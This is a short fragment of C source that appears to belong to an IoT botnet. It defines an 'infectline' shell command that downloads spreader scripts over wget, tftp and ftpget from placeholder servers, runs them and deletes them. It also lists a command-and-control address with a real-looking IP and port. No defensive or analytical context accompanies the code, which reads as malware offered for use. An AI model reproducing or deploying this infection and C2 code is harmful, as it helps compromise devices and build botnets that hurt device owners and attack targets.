...
char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ipdelservidorhttp:puertodelserverhttp/spread.sh; chmod 777 spread.sh; sh spread.sh; tftp ipdelservidortftp:puertoenelquecorre -c get spreadertftp.sh; chmod 777 spreadertftp.sh; sh spreadertftp.sh; ftpget -v -u anonymous -p anonymous -P puertodelservidorftp ipdelservidorftp spreaderftp.sh spreaderftpdescargado.sh; sh spreaderftpdescargado.sh; rm -rf spread.sh spreadertftp.sh spreaderftp.sh; exit\r\n";

// WGET LINE GOES HERE ^

unsigned char *commServer[] =
{
        "190.183.160.12:16970"
	//"5.206.225.136:23"
};
